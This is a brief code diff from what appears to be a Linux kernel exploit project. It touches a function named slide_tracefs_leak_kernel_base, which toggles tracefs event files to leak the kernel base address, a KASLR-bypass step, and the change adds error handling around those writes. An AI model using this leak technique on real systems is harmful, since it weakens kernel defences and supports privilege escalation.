@@ -1,9 +1,7 @@
 #include "common.h"
 
 #define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
-#ifndef SLIDE_TRACEFS_EVENT_ID
 #define SLIDE_TRACEFS_EVENT_ID 109
-#endif
 
 static int slide_tracefs_write(const char *path, const char *value) {
   int fd = open(path, O_WRONLY | O_CLOEXEC);
@@ -82,9 +80,12 @@ static int slide_tracefs_leak_kernel_base(void) {
   static const char event_enable[] =
       SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";
 
-    slide_tracefs_write(tracing_on, "0");
-    slide_tracefs_write(event_enable, "1");
-    slide_tracefs_write(tracing_on, "1");
+  if (!slide_tracefs_write(tracing_on, "0") ||
+      !slide_tracefs_write(event_enable, "1") ||
+      !slide_tracefs_write(tracing_on, "1")) {
+    pr_error("slide tracefs setup failed errno=%d\n", errno);
+    return 0;
+  }
 
   int trace_fd = open(trace, O_WRONLY | O_TRUNC | O_CLOEXEC);
   if (trace_fd >= 0) {
